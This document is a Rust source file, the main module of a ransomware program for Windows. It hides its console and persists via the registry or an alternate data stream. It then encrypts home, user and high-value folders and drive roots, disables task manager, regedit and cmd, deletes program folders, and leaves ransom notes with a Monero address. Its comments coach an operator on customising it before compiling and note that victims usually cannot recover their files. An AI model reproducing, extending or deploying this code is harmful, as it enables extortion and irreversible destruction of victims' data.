#![windows_subsystem = "windows"] // hides execution console
mod encryption; // the module with all the encryption stuff
mod smart_dir; // the module for getting dir list sorted in order of importance.
mod system_changer; // the module for changing registry keys and adding the program to startup
use encryption::encryptor;
use encryption::key_gen;
use mountpoints;
use rand::prelude::*;
use rand_hc::Hc128Rng;
use smart_dir::dir_list;
use std::fs;
use std::process::Command;
use std::thread;
use std::time;
use system_changer::registry_changer;

fn main() {
    // Global vars used in the bellow code, CHANGE BEFORE COMPILING AS THEY ARE SUPPOSED TO BE UNIQUE.
    // Note that if you want to make the ransomware more unique and harder to be removed you should go in other files and change other settings
    // A guide in the README.md on how to make this more random and secure should be coming soon.
    // the amount of money you want to request
    let money_amount = "234.23";
    // your monero address, this is mine if you are wondering
    let my_monero_addr = "45rzJThpy7aX5VNtPxoSUJaRySFHBWT4ZLL2nWafKj6XgvUiQjfKGLT77wuqrja8KW9tawSrStWArMqZwcNk2JZ7748s9yZ";
    // true means using the alternate data stream method, false means using the legacy method of placing the exe somewhere in AppData and adding that to the registry.
    // refer to the README.md or the patch notes on version v0.5.0-alpha.
    let use_alternate_data_stream = true;

    // Adds program to startup based on what the boolean is set to.
    if use_alternate_data_stream {
        registry_changer::start_ransomware_on_startup_alternate_data_stream();
    } else {
        registry_changer::start_ransomware_on_startup_classic();
    }

    // Gets the folders to be encrypted on all the mounted drives in order of importance.
    let mut folders_to_encrypt = Vec::new();
    dir_list::add_valuable_folder_paths_windows(&mut folders_to_encrypt);

    // Gets the folders to be deleted (the ones with non sensitive information)
    let mut unwanted_folders = vec![];
    dir_list::add_non_valuable_folder_paths_windows(&mut unwanted_folders);

    // Creates an encryptor from strong generated keys.
    // Note, usually the ransomware viruses are made so that the victim can't actually decrypt their files and that the keys are random,
    // but if you want to make them decrypt-able you should make a decryptor as there I didn't make one yet and probably won't and a method to send them the decryptor and the key.
    // This could be useful into luring in more people to pay, but will also expose you when it comes to sending the decryptor and key and it's hard when you infect a ton of systems.
    let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());
    let key_bytes = key_gen.gen_key_bytes_128bits();
    let nonce_bytes = key_gen.gen_nonce_bytes();
    let encryptor = encryptor::Encryptor128bit::from(key_bytes, nonce_bytes);

    // First encrypts the files in the home folder (no sub directories).
    match dir_list::get_home_dir() {
        Some(dir) => {
            encryptor.attempt_encrypt_files_in_dir(&dir);

            for user in dir_list::get_users_windows() {
                if &user != &dir {
                    encryptor.attempt_encrypt_files_in_dir(&user);
                }
            }
        }
        None => (),
    }

    // Registry changes to block windows features like task manager, regedit, cmd, change user and many others.
    registry_changer::lock_down_system();

    // Restart explorer.exe in order for registry changes to apply
    restart_explorer();

    // Second encrypts in the vector with the important files.
    for path in folders_to_encrypt {
        encryptor.encrypt_dir(&path);
    }

    // After, it places a bunch of files on the desktop explaining how the virus works and how to decrypt their files
    system_changer::other::put_files_on_desktop_on_how_to_recover_data(
        my_monero_addr,
        money_amount,
    );

    // Third encrypts the files in the root folder of every drive, least likely location to be important files in.
    match mountpoints::mountpaths() {
        Ok(mountpaths) => {
            for mountpath in &mountpaths {
                match fs::read_dir(&mountpath) {
                    Ok(dir_read) => {
                        let mut files = vec![];
                        for entry in dir_read.filter_map(|file| file.ok()) {
                            let path = &entry.path();

                            if path.is_file() {
                                let path_str = match path.to_str() {
                                    Some(path_str) => path_str,
                                    None => continue,
                                };

                                let path_string = path_str.to_owned();
                                files.push(path_string);
                            }
                        }
                        encryptor.encrypt_files(&files);
                    }
                    Err(_) => (),
                }
            }
        }
        Err(_) => (),
    }

    // Forth deletes games folders and program folders. (basically folders that don't have sensitive information)
    encryptor.delete_files_in_dirs(&unwanted_folders);

    // Restart explorer.exe in order to refresh the system for the deleted apps.
    restart_explorer();

    // HACK keeping window opened for debugging purposes.
    // let mut buf = String::new();
    // std::io::stdin().read_line(&mut buf);
}

// Simple function that kills the explorer.exe process and opens it back after
fn restart_explorer() {
    Command::new("taskkill")
        .arg("/f")
        .arg("/im")
        .arg("explorer.exe")
        .spawn();
    thread::sleep(time::Duration::from_secs(1));
    Command::new("explorer.exe").spawn();
}
